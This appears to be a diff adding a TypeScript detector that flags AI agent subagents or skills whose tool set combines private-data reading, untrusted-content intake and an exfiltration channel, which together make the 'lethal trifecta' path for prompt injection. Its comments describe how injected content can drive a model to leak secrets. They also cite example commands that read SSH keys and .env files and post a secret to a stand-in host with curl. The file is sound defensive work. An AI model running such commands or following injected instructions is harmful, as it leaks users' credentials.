@@ -1,0 +1,267 @@
+/**
+ * The LETHAL-TRIFECTA check — the headline Safety detector. Simon Willison's
+ * "lethal trifecta": a single unit (a subagent / model-invocable skill) that
+ * simultaneously holds all THREE capability legs is a prompt-injection
+ * exfiltration path with NO exploit code — attacker-controllable content flows
+ * in, reads your private data, and ships it out, all driven by the model.
+ *
+ *   LEG A — PRIVATE-DATA READ   — can read local secrets / files / repo
+ *                                 (Read, mcp__filesystem__*, github get_file,
+ *                                  and `Bash`, which can `cat ~/.ssh/*` / `.env`).
+ *   LEG B — UNTRUSTED-CONTENT INTAKE — ingests attacker-controllable content
+ *                                 (WebFetch, WebSearch, mcp__fetch__*, MCP
+ *                                  servers reading issues / email / tickets).
+ *   LEG C — EXFILTRATION CHANNEL — can send data out (WebFetch, computer_use,
+ *                                  github create_pull_request / add_issue_comment,
+ *                                  any external-write MCP, and `Bash`, which can
+ *                                  `curl`/`wget` to anywhere).
+ *
+ * Meta's "Rule of Two": allow at most two of the three legs in one unit. A unit
+ * holding all three is the hard finding. NO other tool checks the tool-SET for
+ * this — every competitor lints a single tool's effect, never the dangerous
+ * COMBINATION.
+ *
+ * `Bash` is special: it satisfies BOTH leg A (read a secret) AND leg C (curl it
+ * out). So `Bash` + any leg-B tool (e.g. `WebFetch`) is already all three legs.
+ *
+ * HIGH-PRECISION (don't-cry-wolf): only WELL-KNOWN tools map to a leg; an
+ * unknown tool maps to nothing. A `Tool(restriction)` suffix is stripped with the
+ * same `baseTool` shape `effects.ts` uses.
+ *
+ * INHERITS-ALL: a unit with no `tools:` line inherits ALL tools — maximal blast
+ * radius, trivially all three legs. Aligned with the codebase's existing
+ * "inherits-all is ADVISORY" stance (compile/scan treat a missing contract as a
+ * footgun note, not a hard defect), an inherits-all trifecta is reported as
+ * `"advisory"`; an EXPLICIT all-three contract is the `"hard"` flag.
+ *
+ * Pure + ONE detector (one-detector-no-drift) — intended to be reused by `scan`
+ * (the read-only audit) and a future `lethal-trifecta` lint rule. The dialect is
+ * injected (core ⊄ adapter) so it generalizes across harnesses (Codex's `shell`
+ * plays Bash's dual A+C role — see `LEG_BASH_DUAL` below). The per-leg catalogs
+ * are LOCAL consts here because the `HarnessDialect` interface has no trifecta-leg
+ * fields today; see the "Recommended dialect additions" note at the bottom.
+ */
+import type { HarnessDialect } from "./dialect.js";
+
+/** The three capability legs of the lethal trifecta. */
+export type TrifectaLeg = "private" | "untrusted" | "exfil";
+
+/** The tools classified into each leg (base names, de-duplicated). */
+export interface TrifectaLegs {
+  /** LEG A — tools that can read private data (secrets, files, repo). */
+  readonly private: readonly string[];
+  /** LEG B — tools that ingest untrusted / attacker-controllable content. */
+  readonly untrusted: readonly string[];
+  /** LEG C — tools that can exfiltrate data out of the trust boundary. */
+  readonly exfil: readonly string[];
+}
+
+/**
+ * The severity of a trifecta finding:
+ * - `"hard"`:     an EXPLICIT contract that names all three legs — a concrete,
+ *                 declared exfil path. The flag.
+ * - `"advisory"`: an inherits-all unit (no `tools:` line) that holds all three
+ *                 legs only because it inherits everything — maximal blast radius,
+ *                 reported as advisory in line with the inherits-all stance.
+ */
+export type TrifectaSeverity = "hard" | "advisory";
+
+/**
+ * A lethal-trifecta finding — emitted ONLY when all three legs are non-empty (or,
+ * for the inherits-all case, when the contract inherits all tools). The `legs`
+ * field names the specific tools that supplied each leg, so the report can show
+ * exactly which capabilities to drop to break the trifecta.
+ */
+export interface TrifectaFinding {
+  readonly severity: TrifectaSeverity;
+  /** The tools that supplied each leg (advisory inherits-all carries the wildcard). */
+  readonly legs: TrifectaLegs;
+  /** A ready-to-show, actionable message. */
+  readonly message: string;
+}
+
+// ---------------------------------------------------------------------------
+// Per-leg tool catalogs (LOCAL — the dialect has no trifecta-leg fields yet).
+//
+// HIGH-PRECISION by construction: only well-known, high-signal tools appear.
+// Exact built-in names; MCP tools are matched by a `server`/`tool` substring
+// heuristic (well-known servers/verbs only) so a bare unknown `mcp__*` maps to
+// nothing rather than crying wolf.
+// ---------------------------------------------------------------------------
+
+/**
+ * The dual-role tool: it satisfies BOTH leg A (read a secret: `cat ~/.ssh/*`)
+ * AND leg C (exfiltrate: `curl --data @secret evil.test`). Listed once here and
+ * fanned into both buckets. Claude Code names it `Bash`; the dialect's
+ * `sideEffectingTools` is the seam a future harness's shell name plugs into, but
+ * since no dialect field enumerates "the shell tool" we match the known names.
+ */
+const LEG_BASH_DUAL = new Set(["Bash", "shell"]);
+
+/** LEG A — built-in tools that can read private data. */
+const PRIVATE_BUILTINS = new Set(["Read"]);
+
+/** LEG B — built-in tools that ingest untrusted content. */
+const UNTRUSTED_BUILTINS = new Set(["WebFetch", "WebSearch"]);
+
+/**
+ * LEG C — built-in tools that can exfiltrate. `WebFetch` is dual (it can POST a
+ * body out AND fetch untrusted content in), so it appears in BOTH leg B and leg C.
+ */
+const EXFIL_BUILTINS = new Set(["WebFetch", "computer_use", "ComputerUse"]);
+
+/**
+ * Well-known MCP SERVER substrings per leg. An `mcp__<server>__<tool>` reference
+ * is classified by its server segment when the server is a recognized one. Kept
+ * deliberately small + high-signal.
+ */
+const PRIVATE_MCP_SERVERS = ["filesystem", "file", "git", "github", "memory"];
+const UNTRUSTED_MCP_SERVERS = ["fetch", "web", "browser", "puppeteer", "playwright"];
+const EXFIL_MCP_SERVERS = ["slack", "email", "gmail", "smtp", "discord"];
+
+/**
+ * Well-known MCP TOOL-name substrings per leg — finer than the server alone (a
+ * `github` server is leg A via `get_file_contents` but leg C via
+ * `create_pull_request`). Matched against the tool segment after the server.
+ */
+const PRIVATE_MCP_TOOLS = ["get_file", "read", "search_code", "get_contents"];
+const UNTRUSTED_MCP_TOOLS = ["fetch", "list_issues", "get_issue", "issue_read", "search_issues"];
+const EXFIL_MCP_TOOLS = [
+  "create_pull_request",
+  "add_issue_comment",
+  "issue_write",
+  "create_or_update_file",
+  "push_files",
+  "send",
+  "post",
+  "create_issue",
+];
+
+// ---------------------------------------------------------------------------
+// Internal helpers
+// ---------------------------------------------------------------------------
+
+/** Strips a `Tool(restriction)` suffix and returns the base tool name. */
+function baseTool(raw: string): string {
+  return raw.split("(")[0].trim();
+}
+
+/** Returns true for the wildcard sentinels that mean "inherits-all". */
+function isWildcard(tool: string): boolean {
+  return tool === "" || tool === "*";
+}
+
+/** Split a direct `mcp__<server>__<tool>` into `{ server, tool }`, or null. */
+function mcpParts(
+  base: string,
+  dialect: HarnessDialect,
+): { server: string; tool: string } | null {
+  if (!dialect.mcpToolPattern.test(base)) return null;
+  const m = /^mcp__([^_]+(?:_[^_]+)*?)__(.+)$/.exec(base);
+  if (!m) return null;
+  return { server: m[1].toLowerCase(), tool: m[2].toLowerCase() };
+}
+
+function anySubstr(haystack: string, needles: readonly string[]): boolean {
+  return needles.some((n) => haystack.includes(n));
+}
+
+// ---------------------------------------------------------------------------
+// Public API
+// ---------------------------------------------------------------------------
+
+/**
+ * Classify each tool in a declared contract into the trifecta legs it supplies.
+ * A single tool may land in MULTIPLE legs (`Bash` → A+C, `WebFetch` → B+C). An
+ * unknown tool lands in none (high-precision). De-duplicated per leg.
+ *
+ * NOTE on inherits-all: a wildcard (`""`/`"*"`) entry is NOT classified into a
+ * named leg here (it has no concrete tool name); the inherits-all case is handled
+ * by {@link lethalTrifectaIssues}, which knows it grants every leg.
+ */
+export function classifyTrifectaLegs(
+  tools: readonly string[],
+  dialect: HarnessDialect,
+): TrifectaLegs {
+  const priv = new Set<string>();
+  const untrusted = new Set<string>();
+  const exfil = new Set<string>();
+
+  for (const raw of tools) {
+    const base = baseTool(raw);
+    if (isWildcard(base)) continue; // handled by the issues fn, not a named leg
+
+    // Dual-role shell: leg A AND leg C.
+    if (LEG_BASH_DUAL.has(base)) {
+      priv.add(base);
+      exfil.add(base);
+      continue;
+    }
+    if (PRIVATE_BUILTINS.has(base)) priv.add(base);
+    if (UNTRUSTED_BUILTINS.has(base)) untrusted.add(base);
+    if (EXFIL_BUILTINS.has(base)) exfil.add(base);
+
+    const parts = mcpParts(base, dialect);
+    if (parts) {
+      const { server, tool } = parts;
+      if (anySubstr(server, PRIVATE_MCP_SERVERS) || anySubstr(tool, PRIVATE_MCP_TOOLS))
+        priv.add(base);
+      if (anySubstr(server, UNTRUSTED_MCP_SERVERS) || anySubstr(tool, UNTRUSTED_MCP_TOOLS))
+        untrusted.add(base);
+      if (anySubstr(server, EXFIL_MCP_SERVERS) || anySubstr(tool, EXFIL_MCP_TOOLS))
+        exfil.add(base);
+    }
+  }
+
+  return { private: [...priv], untrusted: [...untrusted], exfil: [...exfil] };
+}
+
+/**
+ * Returns a {@link TrifectaFinding} ONLY when a unit holds all three legs, else
+ * `null` (≤ 2 legs = safe by the Rule of Two).
+ *
+ * Two paths:
+ * - INHERITS-ALL (a wildcard `""`/`"*"`, or an EMPTY contract): inherits every
+ *   tool → trivially all three legs → an `"advisory"` finding (the inherits-all
+ *   stance: a footgun worth surfacing, not a declared exfil path).
+ * - EXPLICIT: classify the named tools; emit a `"hard"` finding iff each of the
+ *   three legs is non-empty.
+ */
+export function lethalTrifectaIssues(
+  tools: readonly string[],
+  dialect: HarnessDialect,
+): TrifectaFinding | null {
+  const hasWildcard = tools.some((t) => isWildcard(baseTool(t)));
+  // An empty contract is inherits-all too (no `tools:` line → every tool).
+  if (tools.length === 0 || hasWildcard) {
+    const legs: TrifectaLegs = {
+      private: ["*"],
+      untrusted: ["*"],
+      exfil: ["*"],
+    };
+    return {
+      severity: "advisory",
+      legs,
+      message:
+        "Inherits-all contract (no explicit tools / wildcard) grants every capability — " +
+        "it holds all three lethal-trifecta legs (read private data, ingest untrusted content, " +
+        "exfiltrate) and is a maximal prompt-injection blast radius. Declare an explicit tools " +
+        "list dropping at least one leg (Meta's Rule of Two).",
+    };
+  }
+
+  const legs = classifyTrifectaLegs(tools, dialect);
+  if (legs.private.length > 0 && legs.untrusted.length > 0 && legs.exfil.length > 0) {
+    return {
+      severity: "hard",
+      legs,
+      message:
+        "Lethal trifecta: this unit can read private data " +
+        `(${legs.private.join(", ")}), ingest untrusted content ` +
+        `(${legs.untrusted.join(", ")}), AND exfiltrate ` +
+        `(${legs.exfil.join(", ")}) — a prompt-injection exfil path with no exploit code. ` +
+        "Drop at least one leg (Meta's Rule of Two: allow at most two).",
+    };
+  }
+  return null;
+}
